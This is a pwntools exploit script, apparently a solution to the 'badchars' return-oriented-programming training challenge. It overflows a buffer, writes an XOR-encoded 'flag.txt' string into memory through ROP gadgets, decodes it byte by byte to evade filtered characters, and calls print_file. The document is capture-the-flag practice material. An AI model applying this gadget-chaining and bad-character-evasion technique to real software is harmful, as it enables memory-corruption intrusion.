#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')
context.terminal = ["alacritty", "-e", "zsh", "-c"]
lib = ELF("./libbadchars.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# RUNPATH:    b'.'
# Stripped:   No

io = start()

# 0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006a0 : pop r14 ; pop r15 ; ret
# 0x0000000000400634 : mov qword ptr [r13], r12 ; ret
# 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

xor(b'%/"$m7;7', b'CCCCCCCC') # <-- flag.txt
payload = b"A" * 40

def build_xor_rop():
    global payload
    for i in range(8):
        payload += p64(0x00000000004006a0)     # r14 ; pop r15 ; ret
        payload += b'CCCCCCCC'                 # r14          
        payload += p64(int(f"0x60150{i}", 16)) # inc the addr
        payload += p64(0x0000000000400628)     # xor byte ptr [r15], r14b ; ret

payload += p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += b'%/"$m7;7'   # r12
payload += p64(0x601500) # r13
payload += b'CCCCCCCC'   # r14          
payload += p64(0x601500) # r15 writeble addr
payload += p64(0x0000000000400634) # mov qword ptr [r13], r12 ; ret

build_xor_rop()

payload += p64(0x00000000004006a3) # pop rdi ; ret
payload += p64(0x601500)
payload += p64(exe.sym["print_file"])

io.sendlineafter(b"> ", payload);

"""
payload += p64(0x0000000000400693) # pop rdi ; ret
payload += p64(0x601500)           
payload += p64(exe.sym["print_file"])
"""
io.interactive()

